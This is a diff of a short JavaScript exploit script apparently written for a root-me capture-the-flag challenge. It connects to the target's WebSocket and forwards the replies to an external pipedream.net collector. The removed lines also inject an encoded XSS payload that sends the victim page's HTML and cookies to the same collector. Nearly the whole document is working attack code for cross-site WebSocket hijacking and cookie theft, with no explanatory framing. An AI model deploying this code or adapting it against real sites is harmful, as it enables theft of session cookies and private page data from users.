@@ -1,19 +1,12 @@
 <script>
-  let w = open("http://ctf19.root-me.org/room"); //go the this url to get the site cookie, idk why it didn"t work when this part was missing
-  setTimeout(() => {
     var websocket = new WebSocket('ws://ctf19.root-me.org/ws');
     websocket.onopen = start;
   websocket.onmessage = handleReply;
   function start(event) {
-    websocket.send("READY");
-    let payload = decodeURIComponent("%3C%3E%3Cscript%3Efetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bbtoa(document.body.innerHTML)%2C%20%7Bmode%3A%20'no-cors'%7D)%3Bfetch('https%3A%2F%2Feocvkn4m3kpce3q.m.pipedream.net%3Fdom%3D'%2Bdocument.cookie%2C%20%7Bmode%3A%20'no-cors'%7D)%3B%3C%2Fscript%3E");
-    websocket.send(payload);
-    websocket.send("READY");
+    websocket.send("hello");
   }
   function handleReply(event) {
     fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors'})
   }
-
-}, 1000)
 
 </script>
